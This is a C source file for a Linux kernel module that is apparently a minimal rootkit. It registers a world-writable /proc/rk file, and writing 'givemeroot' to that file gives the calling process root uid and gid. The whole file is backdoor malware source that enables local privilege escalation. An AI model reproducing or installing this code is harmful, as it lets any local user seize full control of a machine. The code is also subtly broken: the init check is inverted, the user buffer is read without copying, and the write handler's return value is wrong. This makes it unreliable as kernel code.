#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/cred.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

static int size, temp;
static char module_status[1024];

static struct proc_dir_entry *proc_rk;

#define MIN(a,b) \
( \
    { \
        typeof(a) _a = (a); \
        typeof(b) _b = (b); \
        _a < _b ? _a : _b; \
    } \
)

static ssize_t rk_read(struct file *file, char __user *buffer,
    size_t count, loff_t *ppos)
{
    int ret;

    if(count > temp)
        count = temp;

    temp = (temp - count);

    ret = copy_to_user(buffer, module_status, count);

    if(ret);

    if(count == 0)
    {
        sprintf(module_status,
            "CMDS:\n\
            -> givemeroot - uid and gid 0 for writing process\n");

        size = strlen(module_status);
        temp = size;
    }

    return count;
}

static ssize_t rk_write(struct file *file, const char __user *buffer,
    size_t count, loff_t *ppos)
{
    if(!strncmp(buffer, "givemeroot", MIN(10, count)))
    {
        kuid_t rootu;
        kgid_t rootg;

        struct cred *cred = prepare_creds();

        rootu.val = 0;
        rootg.val = 0;

        cred->uid = cred->euid = rootu;
        cred->gid = cred->egid = rootg;
        return commit_creds(cred);
    }

    return count;
}

static const struct file_operations proc_rk_fops =
{
    .owner = THIS_MODULE,
    .read = rk_read,
    .write = rk_write,
};

static int __init procfs_init(void)
{
    proc_rk = proc_create("rk", 0666, NULL, &proc_rk_fops);
    if(proc_rk == NULL)
        return -ENOMEM;

    sprintf(module_status,
        "CMDS:\n\
        -> givemeroot - uid and gid 0 for writing process\n");

    size = strlen(module_status);
    temp = size;

    return 0;
}

static void procfs_clean(void)
{
    if(proc_rk != NULL)
    {
        remove_proc_entry("rk", NULL);
        proc_rk = NULL;
    }
}

static int __init rk_init(void)
{
    if(!procfs_init())
    {
        procfs_clean();
        return 1;
    }

    return 0;
}

static void __exit rk_exit(void)
{
    procfs_clean();
}

module_init(rk_init);
module_exit(rk_exit);
